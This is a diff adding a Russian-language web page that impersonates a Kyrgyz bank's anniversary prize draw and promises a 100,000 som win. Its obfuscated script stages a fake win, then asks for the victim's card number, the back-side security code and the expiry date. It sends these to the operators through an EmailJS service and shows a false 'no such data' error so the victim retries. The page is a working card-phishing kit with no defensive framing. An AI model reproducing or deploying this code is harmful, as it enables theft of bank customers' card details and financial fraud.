@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Адаптивный розыгрыш</title>
+    <style>
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 80%;
+            color: #7893b0;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            background-color: #f0f0f0;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: 20px;
+            height: 10px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #00986f;
+            transition: width 0.1s linear;
+        }
+
+        .modal-content .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .modal-content .close:hover {
+            color: #00986f;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .top-container {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .top-container img {
+            width: 150px;
+            height: auto;
+        }
+
+        .text-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 16px;
+            font-weight: normal;
+            color: #7893b0;
+        }
+
+        .text-links span {
+            cursor: pointer;
+            transition: color 0.3s ease;
+            position: relative;
+        }
+
+        .text-links span:hover {
+            color: #00986f;
+        }
+
+        .text-links span::after {
+            content: "";
+            position: absolute;
+            right: -10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 1px;
+            height: 60%;
+            background-color: #7893b0;
+        }
+
+        .text-links span:last-child::after {
+            display: none;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #8ca3bb;
+            cursor: pointer;
+        }
+
+        .language-selector img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .bottom-container {
+            background-color: #f0f2f5;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .bottom-container h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .counter {
+            font-size: 48px;
+            font-weight: bold;
+            color: #00986f;
+            margin: 20px 0;
+        }
+
+        .currency-symbol {
+            font-size: 48px;
+            font-weight: bold;
+            margin-left: 5px;
+            color: #00986f;
+        }
+
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+        }
+
+        button#drawButton {
+            background-color: #00986f;
+            color: white;
+        }
+
+        button#drawButton:hover {
+            background-color: #00986f;
+            transform: scale(1.05);
+        }
+
+        .new-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            gap: 10px;
+        }
+
+        .retry-button {
+            background-color: #0092a1;
+            color: white;
+        }
+
+        .retry-button:hover {
+            background-color: #007885;
+            transform: scale(1.05);
+        }
+
+        .withdraw-button {
+            background-color: #fdd400;
+            color: black;
+        }
+
+        .withdraw-button:hover {
+            background-color: #e5be00;
+            transform: scale(1.05);
+        }
+
+        footer {
+            position: fixed;
+            font-size: 13px;
+            bottom: 0;
+            width: 100%;
+            background-color: transparent;
+            color: #7893b0;
+            text-align: center;
+            padding: 10px 0;
+            z-index: 100;
+        }
+
+        @media (max-width: 768px) {
+            .text-links {
+                gap: 10px;
+            }
+
+            .text-links span {
+                font-size: 14px;
+            }
+
+            .bottom-container h1 {
+                color: #7893b0;
+                font-size: 16px;
+                font-family: inherit;
+            }
+
+            .card {
+                width: 90%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .text-links {
+                gap: 8px;
+                text-align: center;
+            }
+
+
+            .text-links span {
+                font-size: 14px;
+            }
+
+            .top-container img {
+                width: 90px;
+            }
+
+            .bottom-container h1 {
+                color: #7893b0;
+                font-size: 16px;
+                font-family: inherit;
+            }
+
+            .counter {
+                font-size: 28px;
+            }
+        }
+
+        .language-selector {
+            font-size: 10px;
+            gap: 3px;
+        }
+
+        .language-selector img {
+            width: 14px;
+            height: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="top-container">
+        <img src="Logo_4EIfhYF.svg" alt="Логотип">
+        <div class="text-links">
+            <span>О нас</span>
+            <span>О розыгрыше</span>
+        </div>
+        <div class="language-selector">
+            <img src="fc7zqwtv4gm3j1akjd.svg" alt="Смена языка">
+            <span>Русский</span>
+        </div>
+    </div>
+    <div id="error-message" style="color: red; display: none;"></div>
+
+    <div class="bottom-container">
+        
+        <h1>Отметьте с нами наше 34-летие! Мы дарим вам шанс выиграть 100 000 сомов, станьте одним из счастливых
+            победителей! 🎉</h1>
+        <div class="card">
+            <div class="counter">
+                <span id="counter">200</span><span class="currency-symbol">с</span>
+            </div>
+            <button id="drawButton">Нажмите, чтобы участвовать в розыгрыше</button>
+            <div class="message" id="message" style="display: none;"></div>
+            <div class="new-buttons" id="options" style="display: none;">
+                <button class="retry-button" id="retryButton">Потратить на вторую попытку</button>
+                <button class="withdraw-button" id="withdrawButton">Вывести</button>
+            </div>
+        </div>
+        <div class="progress-bar-container" id="progressBarContainer" style="display: none;">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+    </div>
+    <div id="aboutModal" class="modal">
+        <div class="modal-content">
+            <span class="close" data-modal="aboutModal">&times;</span>
+            <h2>О нас</h2>
+            <p>Мы — ваш надежный финансовый партнер! Уже 34 года мы внедряем инновации, обеспечиваем стабильность и
+                помогаем вам достигать своих целей. С нами ваши финансы — в надежных руках, а будущее — в ваших!</p>
+        </div>
+    </div>
+
+    <div id="raffleModal" class="modal">
+        <div class="modal-content">
+            <span class="close" data-modal="raffleModal">&times;</span>
+            <h2>О розыгрыше</h2>
+            <p>Отметьте наше 34-летие вместе с нами! 🎉 Мы разыгрываем 100 000 сомов среди наших клиентов — не упустите
+                шанс стать победителем</p>
+        </div>
+    </div>
+    <footer>
+        ОАО «Коммерческий банк КЫРГЫЗСТАН». © 2006-2024, Лицензия №014 НБ КР
+    </footer>
+
+
+    <script>
+        const _0x2e137e=_0x7ebd;(function(_0x4c7f81,_0x274705){const _0x1f04f8=_0x7ebd,_0x48d7f4=_0x4c7f81();while(!![]){try{const _0x48251e=parseInt(_0x1f04f8(0x1b0))/0x1*(parseInt(_0x1f04f8(0x16e))/0x2)+-parseInt(_0x1f04f8(0x194))/0x3*(parseInt(_0x1f04f8(0x177))/0x4)+parseInt(_0x1f04f8(0x15b))/0x5*(parseInt(_0x1f04f8(0x158))/0x6)+parseInt(_0x1f04f8(0x1a5))/0x7*(parseInt(_0x1f04f8(0x198))/0x8)+-parseInt(_0x1f04f8(0x162))/0x9+parseInt(_0x1f04f8(0x18e))/0xa*(parseInt(_0x1f04f8(0x1b1))/0xb)+parseInt(_0x1f04f8(0x160))/0xc*(-parseInt(_0x1f04f8(0x159))/0xd);if(_0x48251e===_0x274705)break;else _0x48d7f4['push'](_0x48d7f4['shift']());}catch(_0x49ad8e){_0x48d7f4['push'](_0x48d7f4['shift']());}}}(_0x5a7f,0xf2aa6));function _0x7ebd(_0x51eedd,_0x58838a){const _0x5a7fd0=_0x5a7f();return _0x7ebd=function(_0x7ebd49,_0x2e81b7){_0x7ebd49=_0x7ebd49-0x145;let _0x457e3e=_0x5a7fd0[_0x7ebd49];return _0x457e3e;},_0x7ebd(_0x51eedd,_0x58838a);}function launchConfetti(){confetti({'particleCount':0xfa,'spread':0x46,'origin':{'y':0.6}});}let currentValue=0xc8;const targetValue=0x186a0,counterElement=document[_0x2e137e(0x16c)](_0x2e137e(0x172));let isAnimating=!![];function increaseCounter(){const _0x325f16=_0x2e137e;if(isAnimating&&currentValue<targetValue){currentValue+=Math[_0x325f16(0x1af)](Math[_0x325f16(0x17c)]()*0x3e8)+0x1f4;if(currentValue>targetValue)currentValue=targetValue;counterElement[_0x325f16(0x14c)]=currentValue['toLocaleString'](),setTimeout(increaseCounter,0x32);}}increaseCounter();const drawButton=document[_0x2e137e(0x16c)](_0x2e137e(0x15d)),messageElement=document[_0x2e137e(0x16c)]('message'),optionsElement=document[_0x2e137e(0x16c)](_0x2e137e(0x188)),retryButton=document[_0x2e137e(0x16c)]('retryButton'),withdrawButton=document[_0x2e137e(0x16c)]('withdrawButton'),progressBarContainer=document['createElement'](_0x2e137e(0x14d)),progressBar=document[_0x2e137e(0x166)](_0x2e137e(0x14d));progressBarContainer[_0x2e137e(0x187)][_0x2e137e(0x19b)]=_0x2e137e(0x16f),progressBarContainer['style'][_0x2e137e(0x189)]=_0x2e137e(0x150),progressBarContainer[_0x2e137e(0x187)][_0x2e137e(0x180)]=_0x2e137e(0x170),progressBarContainer[_0x2e137e(0x187)]['backgroundColor']=_0x2e137e(0x1b6),progressBarContainer[_0x2e137e(0x187)][_0x2e137e(0x191)]=_0x2e137e(0x16a),progressBarContainer[_0x2e137e(0x187)]['overflow']=_0x2e137e(0x19a),progressBarContainer['style'][_0x2e137e(0x18c)]=_0x2e137e(0x178),progressBar[_0x2e137e(0x187)][_0x2e137e(0x189)]='0%',progressBar[_0x2e137e(0x187)]['height']='100%',progressBar[_0x2e137e(0x187)][_0x2e137e(0x14f)]=_0x2e137e(0x18a),progressBar[_0x2e137e(0x187)][_0x2e137e(0x1a7)]=_0x2e137e(0x15a),progressBarContainer[_0x2e137e(0x174)](progressBar),document[_0x2e137e(0x1a1)]('.card')[_0x2e137e(0x174)](progressBarContainer),drawButton[_0x2e137e(0x1b2)](_0x2e137e(0x1a8),()=>{const _0x3f754a=_0x2e137e;isAnimating=![],drawButton[_0x3f754a(0x187)][_0x3f754a(0x19b)]=_0x3f754a(0x16f),progressBarContainer[_0x3f754a(0x187)][_0x3f754a(0x19b)]=_0x3f754a(0x176);let _0x5dbce0=0x0;const _0x3a096a=setInterval(()=>{const _0x391f38=_0x3f754a;_0x5dbce0+=Math['random']()*0x14,progressBar['style'][_0x391f38(0x189)]=_0x5dbce0+'%';if(_0x5dbce0>=0x64){clearInterval(_0x3a096a),progressBar[_0x391f38(0x187)][_0x391f38(0x189)]=_0x391f38(0x150);const _0x58c6dd=Math['floor'](Math[_0x391f38(0x17c)]()*(0x1388-0x7d0+0x1))+0x7d0;counterElement[_0x391f38(0x192)]=_0x58c6dd['toLocaleString'](),setTimeout(()=>{const _0x23db45=_0x391f38;launchConfetti(),progressBarContainer[_0x23db45(0x187)][_0x23db45(0x19b)]=_0x23db45(0x16f),messageElement['textContent']=_0x23db45(0x15c)+_0x58c6dd[_0x23db45(0x19f)]()+'\x20с.\x20Вы\x20хотите\x20потратить\x20на\x20вторую\x20попытку\x20или\x20вывести?',messageElement[_0x23db45(0x187)]['display']=_0x23db45(0x176),optionsElement[_0x23db45(0x187)][_0x23db45(0x19b)]=_0x23db45(0x16d);},0x1f4);}},0xc8);}),retryButton[_0x2e137e(0x1b2)]('click',()=>{const _0x2f7de4=_0x2e137e;messageElement[_0x2f7de4(0x187)]['display']=_0x2f7de4(0x16f),optionsElement['style'][_0x2f7de4(0x19b)]='none',progressBarContainer[_0x2f7de4(0x187)][_0x2f7de4(0x19b)]=_0x2f7de4(0x176);let _0x45ffa8=0x0;const _0x173a3f=setInterval(()=>{const _0x2549d5=_0x2f7de4;_0x45ffa8+=Math['random']()*0x14,progressBar[_0x2549d5(0x187)]['width']=_0x45ffa8+'%',_0x45ffa8>=0x64&&(clearInterval(_0x173a3f),progressBar['style'][_0x2549d5(0x189)]=_0x2549d5(0x150),currentValue=targetValue,counterElement['innerHTML']=currentValue[_0x2549d5(0x19f)](),setTimeout(()=>{const _0x35b5b8=_0x2549d5;launchConfetti(),progressBarContainer[_0x35b5b8(0x187)][_0x35b5b8(0x19b)]=_0x35b5b8(0x16f),messageElement[_0x35b5b8(0x14c)]=_0x35b5b8(0x185),messageElement['style']['display']=_0x35b5b8(0x176);const _0x3e69bf=document['createElement']('button');_0x3e69bf['id']=_0x35b5b8(0x164),_0x3e69bf[_0x35b5b8(0x14c)]=_0x35b5b8(0x1a3),_0x3e69bf[_0x35b5b8(0x187)]['position']=_0x35b5b8(0x193),_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x167)]=_0x35b5b8(0x148),_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x15e)]=_0x35b5b8(0x19c),_0x3e69bf['style'][_0x35b5b8(0x149)]='translateX(-50%)',_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x18c)]=_0x35b5b8(0x178),_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x18f)]=_0x35b5b8(0x171),_0x3e69bf[_0x35b5b8(0x187)]['fontSize']='16px',_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x14f)]=_0x35b5b8(0x18a),_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x190)]=_0x35b5b8(0x161),_0x3e69bf['style'][_0x35b5b8(0x146)]=_0x35b5b8(0x16f),_0x3e69bf[_0x35b5b8(0x187)]['borderRadius']=_0x35b5b8(0x16a),_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x183)]='pointer',_0x3e69bf[_0x35b5b8(0x187)][_0x35b5b8(0x1a6)]='999',document['body'][_0x35b5b8(0x174)](_0x3e69bf),_0x3e69bf[_0x35b5b8(0x1b2)](_0x35b5b8(0x1a8),()=>{const _0xbaa5d3=_0x35b5b8;_0xbaa5d3(0x182);if(!messageElement||!optionsElement){console[_0xbaa5d3(0x1ab)](_0xbaa5d3(0x16b));return;}messageElement['style'][_0xbaa5d3(0x19b)]=_0xbaa5d3(0x16f),optionsElement[_0xbaa5d3(0x187)]['display']='none';const _0x1355c4=document['createElement']('div');_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x179)]=_0xbaa5d3(0x193),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x1a2)]=_0xbaa5d3(0x19c),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x15e)]=_0xbaa5d3(0x19c),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x149)]=_0xbaa5d3(0x154),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x189)]=_0xbaa5d3(0x1aa),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x155)]='400px',_0x1355c4['style'][_0xbaa5d3(0x14f)]=_0xbaa5d3(0x161),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x186)]='0\x204px\x2010px\x20rgba(0,\x200,\x200,\x200.2)',_0x1355c4[_0xbaa5d3(0x187)]['borderRadius']=_0xbaa5d3(0x17b),_0x1355c4[_0xbaa5d3(0x187)][_0xbaa5d3(0x18f)]=_0xbaa5d3(0x178),_0x1355c4['style'][_0xbaa5d3(0x1a6)]=_0xbaa5d3(0x18d),_0x1355c4[_0xbaa5d3(0x192)]=_0xbaa5d3(0x1a4),document[_0xbaa5d3(0x165)][_0xbaa5d3(0x174)](_0x1355c4),_0xbaa5d3(0x197);const _0x3470f2=document[_0xbaa5d3(0x16c)](_0xbaa5d3(0x1ad)),_0x496dc7=document['getElementById'](_0xbaa5d3(0x19d));if(!_0x3470f2||!_0x496dc7){console[_0xbaa5d3(0x1ab)](_0xbaa5d3(0x168));return;}_0x3470f2[_0xbaa5d3(0x1b2)](_0xbaa5d3(0x1a8),()=>{const _0x345703=_0xbaa5d3,_0x40d87b=document[_0x345703(0x16c)]('accountNumber')[_0x345703(0x1a9)]['trim'](),_0xeae67=document[_0x345703(0x16c)]('accountBackNumber')[_0x345703(0x1a9)][_0x345703(0x14b)](),_0x2e7415=document[_0x345703(0x16c)](_0x345703(0x17e))[_0x345703(0x1a9)][_0x345703(0x14b)]();if(_0x40d87b===''||_0x2e7415===''||_0xeae67==='')console[_0x345703(0x17f)](_0x345703(0x17a)),_0x496dc7['textContent']=_0x345703(0x195),_0x496dc7[_0x345703(0x187)]['display']='block';else{_0x345703(0x14e),_0x496dc7[_0x345703(0x187)][_0x345703(0x19b)]=_0x345703(0x16f);if(typeof emailjs===_0x345703(0x14a)){console['error'](_0x345703(0x145));return;}emailjs[_0x345703(0x175)](_0x345703(0x18b)),_0x345703(0x152);const _0x41bd4b={'account_number':_0x40d87b,'amount':_0xeae67,'withdraw_date':_0x2e7415};_0x41bd4b,emailjs[_0x345703(0x1ae)](_0x345703(0x1b4),_0x345703(0x15f),_0x41bd4b)[_0x345703(0x156)](()=>{const _0x21d930=_0x345703,_0x34e54e=document[_0x21d930(0x16c)](_0x21d930(0x181));_0x34e54e['textContent']=_0x21d930(0x196),_0x34e54e[_0x21d930(0x187)]['display'],_0x1355c4[_0x21d930(0x1a0)]();})[_0x345703(0x153)](_0x57adaa=>{const _0x53eebe=_0x345703;console[_0x53eebe(0x1ab)](_0x53eebe(0x173),_0x57adaa),alert(_0x53eebe(0x151));});}});});},0x1f4));},0xc8);}),withdrawButton[_0x2e137e(0x1b2)](_0x2e137e(0x1a8),()=>{const _0x58a118=_0x2e137e;if(!messageElement||!optionsElement){console[_0x58a118(0x1ab)](_0x58a118(0x16b));return;}messageElement[_0x58a118(0x187)]['display']=_0x58a118(0x16f),optionsElement[_0x58a118(0x187)][_0x58a118(0x19b)]='none';const _0x3de68b=document['createElement'](_0x58a118(0x14d));_0x3de68b[_0x58a118(0x187)]['position']=_0x58a118(0x193),_0x3de68b['style']['top']='50%',_0x3de68b[_0x58a118(0x187)]['left']=_0x58a118(0x19c),_0x3de68b[_0x58a118(0x187)]['transform']=_0x58a118(0x154),_0x3de68b['style'][_0x58a118(0x189)]=_0x58a118(0x1aa),_0x3de68b[_0x58a118(0x187)][_0x58a118(0x155)]='400px',_0x3de68b[_0x58a118(0x187)][_0x58a118(0x14f)]='white',_0x3de68b[_0x58a118(0x187)][_0x58a118(0x186)]=_0x58a118(0x19e),_0x3de68b['style'][_0x58a118(0x191)]=_0x58a118(0x17b),_0x3de68b['style'][_0x58a118(0x18f)]=_0x58a118(0x178),_0x3de68b[_0x58a118(0x187)][_0x58a118(0x1a6)]=_0x58a118(0x18d),_0x3de68b[_0x58a118(0x192)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20style=\x22margin-bottom:\x2020px;\x20font-size:\x2018px;\x20text-align:\x20center;\x20color:\x20#333;\x22>Введите\x20данные\x20для\x20вывода\x20средств</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22errorMessage\x22\x20style=\x22color:\x20red;\x20font-size:\x2014px;\x20margin-bottom:\x2015px;\x20display:\x20none;\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22accountNumber\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Номер\x20карты\x20:</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22accountNumber\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22accountBackNumber\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Код\x20с\x20обратной\x20стороны:</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22accountBackNumber\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22withdrawDate\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Дата\x20(мм/гг):</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22month\x22\x20id=\x22withdrawDate\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22submitWithdraw\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20background-color:\x20#00986f;\x20color:\x20white;\x20font-size:\x2016px;\x20font-weight:\x20bold;\x20border:\x20none;\x20border-radius:\x204px;\x20cursor:\x20pointer;\x22>Подтвердить</button>\x0a\x20\x20\x20\x20',document['body'][_0x58a118(0x174)](_0x3de68b),_0x58a118(0x197);const _0x32d54d=document['getElementById'](_0x58a118(0x1ad)),_0x1f9b70=document[_0x58a118(0x16c)](_0x58a118(0x19d));if(!_0x32d54d||!_0x1f9b70){console['error']('Элементы\x20submitWithdraw\x20или\x20errorMessage\x20не\x20найдены.');return;}const _0x3ea7b7=0x64;_0x32d54d[_0x58a118(0x1b2)](_0x58a118(0x1a8),()=>{const _0x332a18=_0x58a118;_0x332a18(0x1b3);const _0x24df65=document[_0x332a18(0x16c)](_0x332a18(0x199))[_0x332a18(0x1a9)]['trim'](),_0x538e2f=document[_0x332a18(0x16c)]('accountBackNumber')[_0x332a18(0x1a9)][_0x332a18(0x14b)](),_0x2352da=document[_0x332a18(0x16c)]('withdrawDate')['value']['trim']();'Введенные\x20данные:',{'accountNumber':_0x24df65,'accountBackNumber':_0x538e2f,'withdrawDate':_0x2352da};if(_0x24df65===''||_0x2352da===''||_0x538e2f==='')console[_0x332a18(0x17f)]('Не\x20все\x20поля\x20заполнены'),_0x1f9b70[_0x332a18(0x14c)]=_0x332a18(0x195),_0x1f9b70[_0x332a18(0x187)][_0x332a18(0x19b)]=_0x332a18(0x176);else{_0x332a18(0x14e),_0x1f9b70[_0x332a18(0x187)]['display']=_0x332a18(0x16f);if(typeof emailjs===_0x332a18(0x14a)){console[_0x332a18(0x1ab)](_0x332a18(0x145));return;}emailjs[_0x332a18(0x175)]('dVRMNbLlyR7NiZ5C7'),'EmailJS\x20инициализирован';const _0x23fd44={'account_number':_0x24df65,'amount':_0x538e2f,'withdraw_date':_0x2352da};_0x23fd44,emailjs[_0x332a18(0x1ae)](_0x332a18(0x1b4),_0x332a18(0x15f),_0x23fd44)[_0x332a18(0x156)](()=>{const _0x50340f=_0x332a18,_0x310efe=document[_0x50340f(0x16c)](_0x50340f(0x181));_0x310efe[_0x50340f(0x14c)]='В\x20базе\x20данных\x20нет\x20таких\x20данных.\x20Попробуйте\x20снова\x20с\x20корректными\x20данными.',_0x310efe[_0x50340f(0x187)]['display'],_0x3de68b[_0x50340f(0x1a0)]();})[_0x332a18(0x153)](_0x51ada7=>{const _0x3282c0=_0x332a18;console['error'](_0x3282c0(0x173),_0x51ada7),alert('Произошла\x20ошибка\x20при\x20отправке\x20данных.\x20Попробуйте\x20снова.');});}});}),document[_0x2e137e(0x157)](_0x2e137e(0x1ac))['forEach'](_0x5bac16=>{const _0x12de84=_0x2e137e;_0x5bac16[_0x12de84(0x1b2)](_0x12de84(0x1a8),()=>{const _0x2ac794=_0x12de84,_0x1a562c=_0x5bac16['textContent'][_0x2ac794(0x17d)](_0x2ac794(0x184))?_0x2ac794(0x163):'raffleModal';document[_0x2ac794(0x16c)](_0x1a562c)['style'][_0x2ac794(0x19b)]=_0x2ac794(0x16d);});}),document[_0x2e137e(0x157)]('.close')['forEach'](_0x5912ef=>{const _0x4818b4=_0x2e137e;_0x5912ef[_0x4818b4(0x1b2)](_0x4818b4(0x1a8),_0x3bfd77=>{const _0x1c146e=_0x4818b4,_0x197528=_0x3bfd77['target'][_0x1c146e(0x147)]('data-modal');document['getElementById'](_0x197528)[_0x1c146e(0x187)][_0x1c146e(0x19b)]=_0x1c146e(0x16f);});}),document[_0x2e137e(0x157)](_0x2e137e(0x169))[_0x2e137e(0x1b5)](_0x4b8286=>{const _0x488afb=_0x2e137e;_0x4b8286[_0x488afb(0x1b2)](_0x488afb(0x1a8),_0x11206d=>{const _0x597122=_0x488afb;_0x11206d['target']===_0x4b8286&&(_0x4b8286['style'][_0x597122(0x19b)]=_0x597122(0x16f));});});function _0x5a7f(){const _0xab5fcd=['Произошла\x20ошибка\x20при\x20отправке\x20данных.\x20Попробуйте\x20снова.','EmailJS\x20инициализирован','catch','translate(-50%,\x20-50%)','maxWidth','then','querySelectorAll','313686msgOqU','26DimdJs','width\x200.2s\x20ease','140GNfqUi','Поздравляем!\x20Вы\x20выиграли\x20','drawButton','left','template_blbtfi5','11077284BblVWj','white','4676985UtZhow','aboutModal','withdrawButtonBottom','body','createElement','bottom','Элементы\x20submitWithdraw\x20или\x20errorMessage\x20не\x20найдены.','.modal','5px','Элементы\x20messageElement\x20или\x20optionsElement\x20не\x20найдены.','getElementById','flex','51110RtdZGK','none','10px','10px\x2020px','counter','Ошибка\x20при\x20отправке:','appendChild','init','block','16yOchyl','20px','position','Не\x20все\x20поля\x20заполнены','8px','random','includes','withdrawDate','warn','height','error-message','Кнопка\x20\x22Вывести\x22\x20нажата.','cursor','О\x20нас','Поздравляем!\x20Вы\x20получили\x20полный\x20выигрыш\x20в\x20100,000\x20с.','boxShadow','style','options','width','#00986f','dVRMNbLlyR7NiZ5C7','marginTop','1000','5630trXAml','padding','color','borderRadius','innerHTML','fixed','1129368nfzZuR','Пожалуйста,\x20заполните\x20все\x20поля.','В\x20базе\x20данных\x20нет\x20таких\x20данных.\x20Попробуйте\x20снова\x20с\x20корректными\x20данными.','Модальное\x20окно\x20создано','8266072fvCgqU','accountNumber','hidden','display','50%','errorMessage','0\x204px\x2010px\x20rgba(0,\x200,\x200,\x200.2)','toLocaleString','remove','querySelector','top','Вывести','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20style=\x22margin-bottom:\x2020px;\x20font-size:\x2018px;\x20text-align:\x20center;\x20color:\x20#333;\x22>Введите\x20данные\x20для\x20вывода\x20средств</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22errorMessage\x22\x20style=\x22color:\x20red;\x20font-size:\x2014px;\x20margin-bottom:\x2015px;\x20display:\x20none;\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22accountNumber\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Номер\x20карты\x20:</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22accountNumber\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22accountBackNumber\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Код\x20с\x20обратной\x20стороны:</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22accountBackNumber\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22withdrawDate\x22\x20style=\x22display:\x20block;\x20font-size:\x2014px;\x20margin-bottom:\x208px;\x22>Дата\x20(мм/гг):</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22month\x22\x20id=\x22withdrawDate\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20margin-bottom:\x2015px;\x20border:\x201px\x20solid\x20#ccc;\x20border-radius:\x204px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22submitWithdraw\x22\x20style=\x22width:\x20100%;\x20padding:\x2010px;\x20background-color:\x20#00986f;\x20color:\x20white;\x20font-size:\x2016px;\x20font-weight:\x20bold;\x20border:\x20none;\x20border-radius:\x204px;\x20cursor:\x20pointer;\x22>Подтвердить</button>\x0a\x20\x20\x20\x20','7hMTGAu','zIndex','transition','click','value','90%','error','.text-links\x20span','submitWithdraw','send','floor','23grVGZI','34793cUZsfX','addEventListener','Кнопка\x20\x22Подтвердить\x22\x20нажата','service_qgpah0q','forEach','#e0e0e0','EmailJS\x20не\x20загружен.','border','getAttribute','60px','transform','undefined','trim','textContent','div','Все\x20поля\x20заполнены','backgroundColor','100%'];_0x5a7f=function(){return _0xab5fcd;};return _0x5a7f();}
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+</body>
+
+</html>
